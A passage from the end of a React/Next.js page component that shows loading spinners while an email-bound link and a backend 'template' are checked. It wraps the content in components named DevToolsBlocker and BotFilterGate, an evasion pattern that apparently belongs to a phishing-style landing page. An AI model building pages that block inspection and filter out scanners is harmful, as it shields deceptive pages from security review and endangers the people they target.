          </SecureTemplateContainer>
        </BotFilterGate>
      </>
    )
  }
  
  // MINIMAL: Only show loading if template is actually loading
  // Backend handles everything else - frontend just waits
  if (checkingComplete && email && !template) {
    // Template is loading - show minimal loading (only if needed)
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="text-center">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
          </div>
        </div>
      </>
    )
  }
  
  // Final fallback: Minimal loading only if we don't have email yet
  // This should rarely show since backend handles validation
  if (!email && linkStatus === 'checking') {
  return (
    <>
      <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="text-center">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
          </div>
        </div>
      </>
    )
  }
  
  // If we reach here but still no template/email, show nothing (let backend handle it)
  return null
}

export default function Home() {
  return (
    <Suspense fallback={
      <main className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
          <p className="mt-4 text-gray-600 dark:text-gray-300">Loading...</p>
        </div>
      </main>
    }>
      <HomeContent />
    </Suspense>
  )
}

